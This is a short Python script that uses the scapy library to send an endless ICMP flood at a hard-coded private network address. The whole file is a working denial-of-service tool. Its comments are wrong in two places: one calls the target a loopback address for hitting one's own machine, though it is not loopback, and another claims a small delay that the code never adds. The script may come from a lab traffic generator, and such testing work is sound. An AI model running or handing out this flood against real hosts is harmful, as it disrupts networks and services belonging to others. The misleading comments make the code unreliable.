from scapy.all import *
import time
from helper.ip_address import get_ip_address

# Configuration
TARGET_IP = '192.168.188.1'# Loopback address to target your own machine
PACKET_COUNT = 3000  # Number of ICMP packets to send

def send_icmp_flood(target_ip, count):
    while True:
        for _ in range(count):
            ip = IP(dst=target_ip)
            icmp = ICMP()
            packet = ip/icmp
            send(packet, verbose=0)
            print("icmp sent to: ", target_ip) # Small delay to simulate more realistic traffic # Small delay to simulate more realistic traffic

# Generate ICMP flood
send_icmp_flood(TARGET_IP, PACKET_COUNT)
print(f"Sent {PACKET_COUNT} ICMP packets to {TARGET_IP}")